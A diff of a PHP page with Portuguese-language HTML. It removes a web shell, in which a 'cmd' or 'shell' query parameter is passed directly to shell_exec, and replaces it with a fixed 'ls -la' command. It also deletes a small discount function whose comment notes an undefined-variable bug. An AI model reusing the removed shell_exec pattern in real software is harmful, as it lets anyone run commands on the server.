@@ -1,11 +1,6 @@
 <?php
 
-$cmd =  $_GET['shell'];
-
-$cmd =  $_GET['shell'];
-
-$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'ls -la';
-$output = shell_exec($cmd . ' 2>&1');
+$cmd = 'ls -la';
 ?>
 <!DOCTYPE html>
 <html lang="pt">
@@ -55,18 +50,3 @@ $output = shell_exec($cmd . ' 2>&1');
 </body>
 
 </html>
-
-
-
-<!--  -->
-
-<?php
-
-function calcularDesconto($preco)
-{
-  if ($preco > 100) {
-    $desconto = 10;
-  }
-  // Bug: $desconto pode nao existir se preco <= 100
-  return $preco - $desconto;
-}
